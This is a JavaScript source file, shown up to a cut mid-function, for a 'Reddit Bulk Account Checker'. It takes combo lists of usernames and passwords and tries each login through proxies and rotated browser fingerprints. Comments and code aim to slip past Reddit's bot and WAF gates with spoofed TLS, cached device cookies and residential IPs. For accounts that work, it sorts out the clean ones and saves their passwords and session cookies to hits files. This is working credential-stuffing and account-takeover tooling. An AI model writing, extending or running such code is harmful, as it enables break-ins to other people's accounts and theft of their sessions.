'use strict';

/**
 * Reddit Bulk Account Checker (`reddit_checker.js` — Clean-Hit & Ban/Lock Detection Edition)
 *
 * Designed for direct one-click execution via `run.bat` on Windows (and CLI on any OS):
 *   - Reads `accounts.txt` (`username:password` per line) and optional `proxies.txt`.
 *   - Opens real visible browsers in the background on Windows (`HEADLESS=false`:
 *     Chromium [Chrome/Edge/Opera/Brave/Vivaldi/Ungoogled] + Firefox/Camoufox + Safari/WebKit)
 *     with zero fingerprint collisions across concurrent workers.
 *   - Executes Step 5 Post-Login Account Health Inspection (`oauth /api/v1/me` + `/settings/account` +
 *     cookieless `/user/<name>/about`) so Banned, Shadowbanned, and Password-Reset accounts NEVER pollute `hits.txt`!
 *   - Streams live results immediately to disk as each account finishes:
 *       * `hits.txt`                  -> ONLY 100% Clean, Active, Unbanned accounts (with Karma & Age)
 *       * `hits_clean.txt`            -> ONLY 100% Clean, Active accounts (`username:password` only)
 *       * `banned.txt`                -> Permanently Banned, Temporarily Banned & Shadowbanned accounts
 *       * `password_reset.txt`        -> Security-Locked / Password Reset Required accounts
 *       * `2fa.txt`                   -> Valid password but 2FA / OTP required
 *       * `invalid.txt`               -> Invalid username or password
 *       * `retry_errors.txt`          -> Temporary network / proxy / rate-limit errors
 *       * `results/hits_cookies.jsonl`-> Full `reddit_session` + `token_v2` cookies ONLY for clean active hits
 */

const fs = require('fs');
const path = require('path');
const readline = require('readline');
const { spawn } = require('child_process');
// ── dependency guard ────────────────────────────────────────────────────────
// A freshly extracted ZIP has no node_modules. Without this, Node prints a raw MODULE_NOT_FOUND
// stack (or the window closes instantly when launched from a .bat). Say what to do instead.
for (const dep of ['node-tls-client', 'rebrowser-playwright-core']) {
  try {
    require.resolve(dep);
  } catch {
    const banner = [
      '',
      '======================================================================',
      '  [!] Dependencies are not installed yet',
      '======================================================================',
      `  Missing: ${dep}`,
      '',
      '  Windows : double-click install.bat  (or run: npm install)',
      '  Any OS  : npm install',
      '',
      '  Then re-run. install.bat also downloads the three browser engines.',
      '======================================================================',
      '',
    ].join('\n');
    console.error(banner);
    process.exit(1);
  }
}

const { initTLS, destroyTLS } = require('node-tls-client');


const {
  RedditSolver,
  ensureWindowsTlsDllReady,
  getTlsClientAssetInfo,
  printTlsAssetHelp,
  RotationWorkerPool,
  DebugLogger,
  VERSION,
} = require('./reddit_solver');
const { resolveEffectiveHeadless, discoverEngineBinaries } = require('./src/rotation');
const {
  envInt,
  installGracefulShutdown,
  writeJsonAtomic,
  formatDuration,
} = require('./src/rotation/RuntimeGuard');

const ROOT_DIR = __dirname;

const C = {
  reset: '\x1b[0m',
  bold: '\x1b[1m',
  dim: '\x1b[2m',
  green: '\x1b[32m',
  brightGreen: '\x1b[92m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m',
  gray: '\x1b[90m',
};

const DEFAULT_ACCOUNTS_TEMPLATE = [
  '# ============================================================================',
  '# REDDIT CHECKER — ACCOUNTS LIST (accounts.txt)',
  '# ============================================================================',
  '# নিচে প্রতি লাইনে একটি করে অ্যাকাউন্ট দিন (username:password অথবা email:password)',
  '# হ্যাশ (#) দিয়ে শুরু হওয়া লাইনগুলো কমেন্ট হিসেবে গণ্য হবে (চেক করা হবে না)।',
  '#',
  '# উদাহরণ (Example):',
  '# my_reddit_user1:MySecretPass123',
  '# another_user2:PassWith:ColonInside',
  '# ============================================================================',
  '',
].join('\r\n');

const DEFAULT_PROXIES_TEMPLATE = [
  '# ============================================================================',
  '# REDDIT CHECKER — OPTIONAL PROXIES LIST (proxies.txt)',
  '# ============================================================================',
  '# প্রক্সি থাকলে নিচে প্রতি লাইনে ১টি করে দিন (খালি রাখলে ডাইরেক্ট ইন্টারনেট ব্যবহার হবে)।',
  '# সাপোর্টেড সব ফরম্যাট:',
  '#   http://user:pass@ip:port',
  '#   socks5://user:pass@ip:port',
  '#   ip:port:user:pass',
  '#   ip:port',
  '# ============================================================================',
  '',
].join('\r\n');

/**
 * Parse `accounts.txt` content into unique `{ username, password, raw }` entries.
 * Splits on the FIRST delimiter (`:`, `;`, or `\t`) so colons inside passwords stay intact.
 */
function parseAccountsText(rawText) {
  if (!rawText || typeof rawText !== 'string') return [];
  const lines = rawText.replace(/^\uFEFF/, '').split(/\r?\n/);
  const seen = new Set();
  const accounts = [];

  for (const rawLine of lines) {
    const trimmed = rawLine.trim();
    if (!trimmed || trimmed.startsWith('#') || trimmed.startsWith('//')) continue;

    // Strip optional trailing " | metadata" if someone re-runs a previous output file
    const cleanCombo = trimmed.includes(' | ') ? trimmed.split(' | ')[0].trim() : trimmed;

    let sepIdx = cleanCombo.indexOf(':');
    if (sepIdx <= 0) sepIdx = cleanCombo.indexOf(';');
    if (sepIdx <= 0) sepIdx = cleanCombo.indexOf('\t');
    if (sepIdx <= 0) continue;

    const username = cleanCombo.slice(0, sepIdx).trim();
    const password = cleanCombo.slice(sepIdx + 1).trim();
    if (!username || !password) continue;

    const dedupeKey = `${username.toLowerCase()}\0${password}`;
    if (seen.has(dedupeKey)) continue;
    seen.add(dedupeKey);

    accounts.push({
      username,
      password,
      combo: `${username}:${password}`,
    });
  }

  return accounts;
}

/**
 * Normalize common proxy line formats (`ip:port:user:pass`, `user:pass@ip:port`, `ip:port`, full URLs).
 */
function normalizeProxyLine(rawLine) {
  if (!rawLine || typeof rawLine !== 'string') return null;
  const trimmed = rawLine.trim();
  if (!trimmed || trimmed.startsWith('#') || trimmed.startsWith('//')) return null;

  if (/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//.test(trimmed)) {
    return trimmed;
  }

  if (trimmed.includes('@')) {
    return `http://${trimmed}`;
  }

  const parts = trimmed.split(':');
  if (parts.length === 2 && /^\d+$/.test(parts[1])) {
    return `http://${parts[0]}:${parts[1]}`;
  }

  // Format: `ip:port:user:pass` (pass itself might contain `:`)
  if (parts.length >= 4 && /^\d+$/.test(parts[1])) {
    const host = parts[0];
    const port = parts[1];
    const user = encodeURIComponent(parts[2]);
    const pass = encodeURIComponent(parts.slice(3).join(':'));
    return `http://${user}:${pass}@${host}:${port}`;
  }

  // Format: `user:pass:ip:port`
  if (parts.length === 4 && /^\d+$/.test(parts[3])) {
    const user = encodeURIComponent(parts[0]);
    const pass = encodeURIComponent(parts[1]);
    const host = parts[2];
    const port = parts[3];
    return `http://${user}:${pass}@${host}:${port}`;
  }

  return `http://${trimmed}`;
}

function parseProxiesText(rawText) {
  if (!rawText || typeof rawText !== 'string') return [];
  const seen = new Set();
  const proxies = [];
  for (const line of rawText.replace(/^\uFEFF/, '').split(/\r?\n/)) {
    const norm = normalizeProxyLine(line);
    if (norm && !seen.has(norm)) {
      seen.add(norm);
      proxies.push(norm);
    }
  }
  return proxies;
}

function ensureInputTemplateFiles(accountsPath, proxiesPath) {
  if (!fs.existsSync(accountsPath)) {
    fs.writeFileSync(accountsPath, DEFAULT_ACCOUNTS_TEMPLATE, 'utf-8');
  }
  if (!fs.existsSync(proxiesPath)) {
    fs.writeFileSync(proxiesPath, DEFAULT_PROXIES_TEMPLATE, 'utf-8');
  }
}

function setConsoleWindowTitle(title) {
  if (process.stdout && process.stdout.isTTY) {
    process.stdout.write(`\x1b]0;${title}\x07`);
  }
}

function promptLine(questionText) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(questionText, (answer) => {
      rl.close();
      resolve(answer || '');
    });
  });
}

function parseCheckerCliArgs(argv) {
  const opts = {
    accountsFile: path.join(ROOT_DIR, 'accounts.txt'),
    proxiesFile: path.join(ROOT_DIR, 'proxies.txt'),
    concurrency: envInt('WORKER_CONCURRENCY', 4, { min: 1, max: 32 }),
    rotationMode: process.env.ROTATION_MODE || 'hybrid',
    solverMode: process.env.SOLVER_MODE || 'auto',
    headless: undefined,
    rotatingProxy: process.env.ROTATING_PROXY === 'true',
    debug: process.env.DEBUG === '1',
    selfTest: false,
    help: false,
  };

  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--help' || a === '-h') opts.help = true;
    else if (a === '--self-test') opts.selfTest = true;
    else if ((a === '--accounts' || a === '-a') && argv[i + 1]) {
      opts.accountsFile = path.resolve(argv[++i]);
    } else if ((a === '--proxies' || a === '-p') && argv[i + 1]) {
      opts.proxiesFile = path.resolve(argv[++i]);
    } else if ((a === '--threads' || a === '-t' || a === '--concurrency') && argv[i + 1]) {
      opts.concurrency = Math.max(1, Number(argv[++i]) || 4);
    } else if (a === '--rotation-mode' && argv[i + 1]) {
      opts.rotationMode = argv[++i];
    } else if (a === '--mode' && argv[i + 1]) {
      opts.solverMode = argv[++i];
    } else if (a === '--headed' || a === '--show-browser') {
      opts.headless = false;
    } else if (a === '--headless') {
      opts.headless = true;
    } else if (a === '--rotating-proxy') {
      opts.rotatingProxy = true;
    } else if (a === '--debug') {
      opts.debug = true;
    }
  }

  return opts;
}

/**
 * Decide which solver stack can actually run on THIS machine, before 500 accounts are attempted.
 *
 * Real failure seen in the field: a fresh clone with no Playwright binaries and `SOLVER_MODE=auto`
 * checked every account into "no browser binary" errors. Now the mode degrades explicitly (with a
 * visible warning) or refuses to start when the user pin-pointed `browser` mode.
 *
 * @param {'auto'|'browser'|'http'} requested
 * @returns {{mode: string, engines: string[], note: string|null, blocker: string|null}}
 */
function resolveEffectiveSolverMode(requested) {
  const mode = ['auto', 'browser', 'http'].includes(requested) ? requested : 'auto';
  let engines = [];
  try {
    const discovery = discoverEngineBinaries();
    engines = Object.entries(discovery.engines || {})
      .filter(([, v]) => v && v.available)
      .map(([k]) => k);
  } catch (err) {
    engines = [];
  }

  if (mode === 'http') return { mode: 'http', engines, note: null, blocker: null };

  if (engines.length === 0) {
    if (mode === 'browser') {
      return {
        mode,
        engines,
        note: null,
        blocker:
          'SOLVER_MODE=browser was requested but no Chromium/Firefox/WebKit binary was found.\n' +
          '  Fix: `npm run setup:browsers` (or `npx rebrowser-playwright-core install chromium firefox webkit`),\n' +
          '  then `npm run doctor`. Or run with `--mode http` / `--mode auto`.',
      };
    }
    return {
      mode: 'http',
      engines,
      note:
        'No browser binary found — falling back to the HTTP/TLS solver for this run ' +
        '(`npm run setup:browsers` enables the browser path).',
      blocker: null,
    };
  }

  return { mode, engines, note: null, blocker: null };
}

/** RAM sanity check: one OS browser process per account attempt is safe, twelve are not. */
function describeResourceProfile({ mode, workerCount, headless }) {
  const dedicated = process.env.DEDICATED_BROWSER_PROCESS !== '0';
  const perBrowserMb = headless ? 180 : 260;
  const estMb = mode === 'http' ? 40 : workerCount * (dedicated ? perBrowserMb : 120);
  const warnings = [];
  if (mode !== 'http' && dedicated && workerCount > 6) {
    warnings.push(
      `${workerCount} concurrent dedicated browsers ≈ ${estMb}MB RAM. ` +
        'Lower --threads (4-6 is the sweet spot) or set DEDICATED_BROWSER_PROCESS=0.'
    );
  }
  return { dedicated, estimatedRamMb: estMb, warnings };
}

function printCheckerHelp() {
  console.log(`
Reddit Bulk Checker v${VERSION} — Hybrid Multi-Browser Rotation
========================================================
Usage:
  run.bat                                     (Double-click on Windows)
  node reddit_checker.js [options]

Options:
  -a, --accounts <path>     Accounts file (default: ./accounts.txt, user:pass per line)
  -p, --proxies <path>      Optional proxies file (default: ./proxies.txt)
  -t, --threads <N>         Concurrent browser workers (default: WORKER_CONCURRENCY=4)
  --headed, --show-browser  Show real browser windows in background (default on Windows)
  --headless                Hide browser windows completely
  --rotation-mode <mode>    hybrid (default) | single-engine | multi-engine
  --mode <auto|browser|http> Solver mode (default: auto = real Browser BotGuard primary)
  --rotating-proxy          Treat proxy as a rotating residential gateway (0ms IP pacing)
  --debug                   Verbose debug output
  --self-test               Run offline parser & output writer self-test
`);
}

function createOutPaths(rootDir = ROOT_DIR) {
  const resultsDir = path.join(rootDir, 'results');
  if (!fs.existsSync(resultsDir)) {
    fs.mkdirSync(resultsDir, { recursive: true });
  }
  return {
    hits: path.join(rootDir, 'hits.txt'),
    hitsClean: path.join(rootDir, 'hits_clean.txt'),
    banned: path.join(rootDir, 'banned.txt'),
    passwordReset: path.join(rootDir, 'password_reset.txt'),
    twoFa: path.join(rootDir, '2fa.txt'),
    invalid: path.join(rootDir, 'invalid.txt'),
    errors: path.join(rootDir, 'retry_errors.txt'),
    hitsCookiesJsonl: path.join(resultsDir, 'hits_cookies.jsonl'),
  };
}

function recordAccountOutcome({ res, acct, stats, outPaths }) {
  const h = res.accountHealth || {};
  const resolvedUser = h.username || acct.username;
  const karmaPart =
    h.totalKarma !== null && h.totalKarma !== undefined
      ? ` | karma=${h.totalKarma} (post:${h.linkKarma ?? 0}, comment:${h.commentKarma ?? 0})`
      : '';
  const agePart = h.accountAge ? ` | age=${h.accountAge}` : '';
  const emailPart =
    h.emailVerified !== null && h.emailVerified !== undefined
      ? ` | email_verified=${h.emailVerified}`
      : '';

  // STRICT CLEAN HIT GUARD: `res.success` MUST be true AND verdict MUST be `AUTHENTICATED` AND not restricted!
  const isRestrictedVerdict =
    res.verdict === 'BANNED_SUSPENDED' ||
    res.verdict === 'BANNED_TEMP' ||
    res.verdict === 'SHADOWBANNED' ||
    res.verdict === 'PASSWORD_RESET_REQUIRED' ||
    res.verdict === 'LOCKED_OR_SUSPENDED' ||
    res.verdict === 'SESSION_INVALID' ||
    h.healthy === false;

  if (res.success === true && res.verdict === 'AUTHENTICATED' && !isRestrictedVerdict) {
    stats.hits += 1;
    const subInfo = res.jwtInfo?.sub || h.userId ? ` | id=${res.jwtInfo?.sub || h.userId}` : '';
    fs.appendFileSync(
      outPaths.hits,
      `${acct.combo} | user=${resolvedUser} | status=ACTIVE${karmaPart}${agePart}${emailPart}${subInfo} | browser=${res.brandId}\r\n`,
      'utf-8'
    );
    fs.appendFileSync(outPaths.hitsClean, `${acct.combo}\r\n`, 'utf-8');
    fs.appendFileSync(
      outPaths.hitsCookiesJsonl,
      JSON.stringify({
        timestamp: new Date().toISOString(),
        username: acct.username,
        actualUsername: resolvedUser,
        password: acct.password,
        accountStatus: 'ACTIVE',
        userId: res.jwtInfo?.sub || h.userId || null,
        totalKarma: h.totalKarma ?? null,
        linkKarma: h.linkKarma ?? null,
        commentKarma: h.commentKarma ?? null,
        accountAge: h.accountAge ?? null,
        emailVerified: h.emailVerified ?? null,
        browser: res.brandId,
        engine: res.engine,
        cookies: res.cookies || {},
      }) + '\r\n',
      'utf-8'
    );
    return {
      bucket: 'hit',
      tag: `${C.brightGreen}${C.bold}[HIT / CLEAN ]${C.reset}`,
      summaryText: `${C.green}ACTIVE${C.reset}${
        h.totalKarma !== null && h.totalKarma !== undefined
          ? ` (karma=${h.totalKarma}, age=${h.accountAge || 'n/a'}, email=${h.emailVerified ? 'verified' : 'unverified'})`
          : ''
      }`,
    };
  }

  if (
    res.verdict === 'BANNED_SUSPENDED' ||
    res.verdict === 'BANNED_TEMP' ||
    res.verdict === 'SHADOWBANNED'
  ) {
    stats.banned += 1;
    const reason = h.reason || (res.messages || []).join('; ') || res.verdict;
    fs.appendFileSync(
      outPaths.banned,
      `${acct.combo} | verdict=${res.verdict} | user=${resolvedUser}${karmaPart}${agePart} | detail=${reason}\r\n`,
      'utf-8'
    );
    const badge =
      res.verdict === 'SHADOWBANNED'
        ? `${C.red}${C.bold}[SHADOWBANNED]${C.reset}`
        : res.verdict === 'BANNED_TEMP'
        ? `${C.red}${C.bold}[BANNED/TEMP ]${C.reset}`
        : `${C.red}${C.bold}[BANNED/PERM ]${C.reset}`;
    return {
      bucket: 'banned',
      tag: badge,
      summaryText: `${C.red}${reason}${C.reset} (saved to banned.txt, NOT hits.txt)`,
    };
  }

  if (res.verdict === 'PASSWORD_RESET_REQUIRED' || res.verdict === 'LOCKED_OR_SUSPENDED') {
    stats.passwordReset += 1;
    const reason = h.reason || (res.messages || []).join('; ') || 'Password reset required / Security locked';
    fs.appendFileSync(
      outPaths.passwordReset,
      `${acct.combo} | verdict=${res.verdict} | user=${resolvedUser}${karmaPart}${agePart} | detail=${reason}\r\n`,
      'utf-8'
    );
    return {
      bucket: 'passwordReset',
      tag: `${C.yellow}${C.bold}[PASS RESET  ]${C.reset}`,
      summaryText: `${C.yellow}${reason}${C.reset} (saved to password_reset.txt, NOT hits.txt)`,
    };
  }

  if (res.otpRequired || res.verdict === 'OTP_REQUIRED') {
    stats.twoFa += 1;
    fs.appendFileSync(outPaths.twoFa, `${acct.combo} | 2FA_OTP_REQUIRED | browser=${res.brandId}\r\n`, 'utf-8');
    return {
      bucket: 'twoFa',
      tag: `${C.cyan}${C.bold}[2FA / OTP   ]${C.reset}`,
      summaryText: 'Valid password, 2FA code required',
    };
  }

  if (res.verdict === 'INVALID_CREDENTIALS') {
    stats.invalid += 1;
    fs.appendFileSync(outPaths.invalid, `${acct.combo}\r\n`, 'utf-8');
    return {
      bucket: 'invalid',
      tag: `${C.red}[INVALID PASS]${C.reset}`,
      summaryText: 'Wrong username/password',
    };
  }

  // IP-level bot gate: the account was never actually tested, so it must not be counted as
  // invalid/banned/hit. It is listed in errors.txt so it can be re-run from a residential IP.
  if (res.verdict === 'WAF_BLOCKED' || res.wafKind) {
    stats.errors += 1;
    stats.wafBlocked = (stats.wafBlocked || 0) + 1;
    const gateDetail = `${res.verdict || 'WAF_BLOCKED'} (${res.wafKind || 'gate'}${res.widget ? `/${res.widget}` : ''})`;
    fs.appendFileSync(
      outPaths.errors,
      `${acct.combo} | ${gateDetail} | NOT_CHECKED — needs residential/home IP | ${res.error || ''}\r\n`,
      'utf-8'
    );
    return {
      bucket: 'errors',
      tag: `${C.yellow}${C.bold}[WAF/GATE  ]${C.reset}`,
      summaryText: `${gateDetail} — account not tested, use a residential/home IP (datacenter proxies are always gated)`,
    };
  }

  stats.errors += 1;
  const errDetail = res.error || h.reason || (res.messages || []).join('; ') || res.verdict || 'UNKNOWN_ERROR';
  fs.appendFileSync(outPaths.errors, `${acct.combo} | ${errDetail}\r\n`, 'utf-8');
  return {
    bucket: 'errors',
    tag: `${C.magenta}[RETRY / ERR ]${C.reset}`,
    summaryText: errDetail,
  };
}

async function runSelfTest() {
  const assert = require('assert');
  const os = require('os');
  console.log(`Running Reddit Bulk Checker v${VERSION} self-test...`);

  const sampleAccounts = parseAccountsText(`
    # comment line
    alice:Pass123
    bob:My:Complex:Pass
    alice:Pass123
    charlie:Secret99 | old_note
  `);
  assert.strictEqual(sampleAccounts.length, 3, 'Should parse 3 unique accounts');
  assert.strictEqual(sampleAccounts[1].password, 'My:Complex:Pass', 'Should preserve colons inside password');
  assert.strictEqual(sampleAccounts[2].username, 'charlie', 'Should strip trailing | metadata');

  const sampleProxies = parseProxiesText(`
    1.2.3.4:8080
    5.6.7.8:3128:myuser:mypass
    socks5://u:p@9.9.9.9:1080
  `);
  assert.strictEqual(sampleProxies[0], 'http://1.2.3.4:8080');
  assert.strictEqual(sampleProxies[1], 'http://myuser:mypass@5.6.7.8:3128');
  assert.strictEqual(sampleProxies[2], 'socks5://u:p@9.9.9.9:1080');

  // Verify strict separation of Clean Hits vs Banned vs Shadowbanned vs Password-Reset files!
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'reddit-checker-v23-'));
  try {
    const outPaths = createOutPaths(tmpDir);
    const stats = { hits: 0, banned: 0, passwordReset: 0, twoFa: 0, invalid: 0, errors: 0 };

    recordAccountOutcome({
      acct: { username: 'good_acc', password: 'p1', combo: 'good_acc:p1' },
      res: {
        success: true,
        verdict: 'AUTHENTICATED',
        brandId: 'firefox',
        engine: 'firefox',
        accountHealth: { healthy: true, username: 'GoodAcc', totalKarma: 950, linkKarma: 150, commentKarma: 800, accountAge: '2y 3m', emailVerified: true },
      },
      stats,
      outPaths,
    });
    recordAccountOutcome({
      acct: { username: 'perm_banned', password: 'p2', combo: 'perm_banned:p2' },
      res: {
        success: false,
        verdict: 'BANNED_SUSPENDED',
        brandId: 'chrome',
        accountHealth: { healthy: false, username: 'PermBanned', reason: 'Permanently banned (is_suspended=true)' },
      },
      stats,
      outPaths,
    });
    recordAccountOutcome({
      acct: { username: 'shadow_banned', password: 'p3', combo: 'shadow_banned:p3' },
      res: {
        success: false,
        verdict: 'SHADOWBANNED',
        brandId: 'safari',
        accountHealth: { healthy: false, username: 'ShadowBanned', reason: 'Public profile 404' },
      },
      stats,
      outPaths,
    });
    recordAccountOutcome({
      acct: { username: 'reset_locked', password: 'p4', combo: 'reset_locked:p4' },
      res: {
        success: false,
        verdict: 'PASSWORD_RESET_REQUIRED',
        brandId: 'brave',
        accountHealth: { healthy: false, username: 'ResetLocked', reason: 'Force password reset required' },
      },
      stats,
      outPaths,
    });

    assert.strictEqual(stats.hits, 1, 'Only 1 clean account should count as hit');
    assert.strictEqual(stats.banned, 2, 'Both permanent ban and shadowban should go to banned');
    assert.strictEqual(stats.passwordReset, 1, 'Password reset account should go to passwordReset');

    const hitsText = fs.readFileSync(outPaths.hits, 'utf-8');
    const hitsCleanText = fs.readFileSync(outPaths.hitsClean, 'utf-8');
    const bannedText = fs.readFileSync(outPaths.banned, 'utf-8');
    const resetText = fs.readFileSync(outPaths.passwordReset, 'utf-8');

    assert(hitsText.includes('good_acc:p1') && hitsText.includes('karma=950'), 'hits.txt must contain clean hit + karma');
    assert(!hitsText.includes('perm_banned') && !hitsText.includes('shadow_banned') && !hitsText.includes('reset_locked'), 'hits.txt MUST NOT contain banned or password-reset accounts');
    assert.strictEqual(hitsCleanText.trim(), 'good_acc:p1', 'hits_clean.txt must contain pure user:pass for clean hit only');
    assert(bannedText.includes('perm_banned:p2') && bannedText.includes('shadow_banned:p3'), 'banned.txt must contain banned & shadowbanned accounts');
    assert(resetText.includes('reset_locked:p4'), 'password_reset.txt must contain security-locked reset account');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }

  console.log('  [OK] Account/Proxy parser + Clean-Hit / Banned / Shadowbanned / Password-Reset routing passed!');
}

async function runBulkChecker() {
  const cli = parseCheckerCliArgs(process.argv.slice(2));
  if (cli.help) {
    printCheckerHelp();
    return;
  }
  if (cli.selfTest) {
    await runSelfTest();
    return;
  }

  ensureInputTemplateFiles(cli.accountsFile, cli.proxiesFile);

  let accounts = parseAccountsText(fs.readFileSync(cli.accountsFile, 'utf-8'));

  // If accounts.txt has 0 accounts when double-clicked, guide the user interactively instead of exiting abruptly!
  if (accounts.length === 0 && process.stdin.isTTY) {
    console.log('========================================================================');
    console.log(`${C.yellow}${C.bold}  [!] accounts.txt ফাইলে এখনো কোনো অ্যাকাউন্ট (username:password) দেওয়া হয়নি!${C.reset}`);
    console.log('========================================================================');
    console.log(`  File Path: ${cli.accountsFile}`);
    console.log('  প্রতি লাইনে ১টি করে username:password পেস্ট করে Save (Ctrl+S) করুন।\n');

    if (process.platform === 'win32') {
      try {
        const child = spawn('notepad.exe', [cli.accountsFile], {
          detached: true,
          stdio: 'ignore',
        });
        child.unref();
        console.log(`  ${C.cyan}[i] আপনার সুবিধার জন্য Notepad-এ accounts.txt ওপেন করে দেওয়া হয়েছে!${C.reset}\n`);
      } catch (_) {}
    }

    const manualInput = (
      await promptLine(
        '  accounts.txt সেভ করে [Enter] চাপুন (অথবা টেস্টের জন্য এখানে সরাসরি user:pass লিখুন): '
      )
    ).trim();

    if (manualInput && manualInput.includes(':')) {
      fs.appendFileSync(cli.accountsFile, `\r\n${manualInput}\r\n`, 'utf-8');
    }
    accounts = parseAccountsText(fs.readFileSync(cli.accountsFile, 'utf-8'));
  }

  if (accounts.length === 0) {
    console.error(
      `\n${C.red}[ERROR] No valid "username:password" lines found in ${cli.accountsFile}.${C.reset}`
    );
    console.error('Please add accounts to accounts.txt (one username:password per line) and run again.');
    process.exitCode = 1;
    return;
  }

  const fileProxies = fs.existsSync(cli.proxiesFile)
    ? parseProxiesText(fs.readFileSync(cli.proxiesFile, 'utf-8'))
    : [];
  const proxies =
    fileProxies.length > 0
      ? fileProxies
      : process.env.PROXY_URL
      ? [normalizeProxyLine(process.env.PROXY_URL)].filter(Boolean)
      : [];

  const effectiveHeadless = resolveEffectiveHeadless(cli.headless);
  const workerCount = Math.min(cli.concurrency, accounts.length);

  // Preflight: never start a 500-account run on a stack that cannot work here.
  const modeInfo = resolveEffectiveSolverMode(cli.solverMode);
  if (modeInfo.blocker) {
    console.error(`\n${C.red}[PREFLIGHT FAILED] ${modeInfo.blocker}${C.reset}\n`);
    process.exitCode = 1;
    return;
  }
  cli.solverMode = modeInfo.mode;
  if (modeInfo.note) console.warn(`${C.yellow}[PREFLIGHT] ${modeInfo.note}${C.reset}`);

  const resources = describeResourceProfile({
    mode: modeInfo.mode,
    workerCount,
    headless: effectiveHeadless,
  });
  for (const w of resources.warnings) console.warn(`${C.yellow}[RESOURCES] ${w}${C.reset}`);

  const tlsAsset = getTlsClientAssetInfo();
  if (!tlsAsset.ok) {
    console.warn(
      `${C.yellow}[PREFLIGHT] node-tls-client asset missing (${tlsAsset.tempPath}). ` +
        `Every mode needs it for the login POST — the first run downloads ~15MB; without ` +
        `internet, run install.bat or copy the file into .bin_cache/.${C.reset}`
    );
  }

  const outPaths = createOutPaths(ROOT_DIR);

  console.log('========================================================================');
  console.log(`${C.cyan}${C.bold}  REDDIT BULK ACCOUNT CHECKER v${VERSION} — CLEAN-HIT & BAN/LOCK DETECTOR${C.reset}`);
  console.log('========================================================================');
  console.log(`  Accounts Loaded  : ${C.bold}${accounts.length}${C.reset} (${path.basename(cli.accountsFile)})`);
  console.log(
    `  Network Mode     : ${
      proxies.length === 0
        ? `${C.brightGreen}${C.bold}DIRECT LOCAL IP (Proxy OFF — Single-IP Burst-Safe Pacing)${C.reset}`
        : `${C.bold}${proxies.length} Proxies Loaded${C.reset} (${path.basename(cli.proxiesFile)})`
    }`
  );
  console.log(
    `  Worker Threads   : ${C.bold}${workerCount}${C.reset} concurrent ` +
      (modeInfo.mode === 'http' ? 'TLS-only workers' : 'zero-collision browsers') +
      ` (${resources.dedicated ? 'one OS process per account' : 'shared process'}, ~${resources.estimatedRamMb}MB)`
  );
  console.log(
    `  Engines Found    : ${modeInfo.engines.length ? modeInfo.engines.join(', ') : 'none (HTTP mode)'} | ` +
      `Solver: ${C.bold}${modeInfo.mode}${C.reset} | HTTP2: ${process.env.DISABLE_HTTP2 !== '0' ? 'off (safer)' : 'on'}`
  );
  console.log(`  Rotation Mode    : ${C.bold}${cli.rotationMode}${C.reset} (Chrome/Edge/Opera/Brave/Vivaldi/Firefox/Camoufox/Safari)`);
  console.log(
    `  Browser Window   : ${
      effectiveHeadless
        ? `${C.yellow}Headless (Hidden)${C.reset}`
        : `${C.brightGreen}${C.bold}VISIBLE IN BACKGROUND (Headed Mode ON)${C.reset}`
    }`
  );
  console.log(`  Health Inspector : ${C.brightGreen}${C.bold}ON${C.reset} (Blocks Banned, Shadowbanned & Password-Reset from hits.txt)`);
  console.log(`  Live Save Files  : hits.txt | hits_clean.txt | banned.txt | password_reset.txt | 2fa.txt | invalid.txt`);
  console.log('========================================================================\n');

  const stats = {
    checked: 0,
    hits: 0,
    banned: 0,
    passwordReset: 0,
    twoFa: 0,
    invalid: 0,
    errors: 0,
    byBrand: {},
    byEngine: {},
  };

  const startedAt = Date.now();
  const updateTitle = () => {
    setConsoleWindowTitle(
      `Reddit Checker v${VERSION} | ${stats.checked}/${accounts.length} | CleanHits: ${stats.hits} | Banned: ${stats.banned} | PassReset: ${stats.passwordReset} | 2FA: ${stats.twoFa} | Bad: ${stats.invalid}`
    );
  };
  updateTitle();

  const logger = new DebugLogger({
    level: cli.debug ? 'debug' : 'error',
  });

  // Ctrl+C must close the browsers, not leave them behind on the desktop.
  let poolRef = null;
  const shutdown = installGracefulShutdown({
    logger,
    name: 'reddit-checker',
    onShutdown: async () => {
      await poolRef?.shutdown?.().catch?.(() => {});
      await destroyTLS().catch(() => {});
    },
  });

  const accountMap = new Map(accounts.map((a, idx) => [idx, a]));

  // W16: per-account returning-device cookie cache. Default ON (v2.4.0): a re-checked account
  // must present its own previous first-party device cookies (loid/rdt/edgebucket/csv) instead
  // of looking like a brand-new device from a new IP every run — that pattern is exactly what
  // Reddit's bot gate flags. `DEVICE_CACHE=0` disables it. Cache is keyed by username, so two
  // accounts can never read each other's device identity.
  const deviceCacheEnabled = process.env.DEVICE_CACHE !== '0';
  const deviceCachePath = path.join(outPaths.hitsCookiesJsonl ? path.dirname(outPaths.hitsCookiesJsonl) : ROOT_DIR, 'device_cache.json');
  let deviceCache = {};
  if (deviceCacheEnabled) {
    try {
      if (fs.existsSync(deviceCachePath)) {
        deviceCache = JSON.parse(fs.readFileSync(deviceCachePath, 'utf-8'));
      }
    } catch {
      deviceCache = {};
    }
    for (const a of accounts) {
      const cached = deviceCache[a.username.toLowerCase()];
      if (cached) a.deviceCookies = cached;
    }
  }

  ensureWindowsTlsDllReady();
  // The dependency can `process.exit(1)` from inside a failed download — make sure the user sees
  // the real reason instead of a silently closing window.
  process.once('exit', (code) => {
    if (code !== 0 && !getTlsClientAssetInfo().ok) printTlsAssetHelp();
  });
  try {
    await initTLS();
  } catch (err) {
    printTlsAssetHelp();
    console.error(`\n${C.red}[FATAL] TLS client failed to initialise: ${err.message}${C.reset}\n`);
    process.exitCode = 1;
    return;
  }
  const pool = new RotationWorkerPool({
    rotationMode: cli.rotationMode,
    solverMode: cli.solverMode,
    concurrency: workerCount,
    headless: effectiveHeadless,
    proxies,
    isRotatingGatewayProxy: cli.rotatingProxy,
    SolverClass: RedditSolver,
    logger,
  });
  poolRef = pool;

  try {
    await pool.runAccountBatch(accounts, {
      quiet: !cli.debug,
      onResult: (res, idx) => {
        stats.checked += 1;
        const acct = accountMap.get(idx) || { username: res.username, password: '', combo: `${res.username}:` };
